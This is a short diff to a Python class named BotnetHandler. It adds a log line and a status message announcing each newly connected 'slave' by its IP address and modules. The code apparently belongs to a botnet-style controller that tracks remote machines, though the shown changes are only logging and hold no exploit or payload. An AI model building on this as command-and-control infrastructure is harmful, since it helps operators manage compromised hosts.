@@ -58,6 +58,7 @@ class BotnetHandler( object ):
 
         self.calls = calls
         self.modules = modules
+        print( "Call list remade!", flush=True )
 
     def server_setup( self ):
         try:
@@ -90,6 +91,10 @@ class BotnetHandler( object ):
                     if module not in self.modules:
                         self.refresh_module_list()
                     self.load[ module ].put( slave_number )
+                    self.system.put( {"topic":[self.name],
+                                    "code":2,
+                                    "ttl": 10,
+                                    "content": "New slave at " + slave["address"][0] + " with " + str( slave["modules"] ) })
 
         except BlockingIOError:
             pass
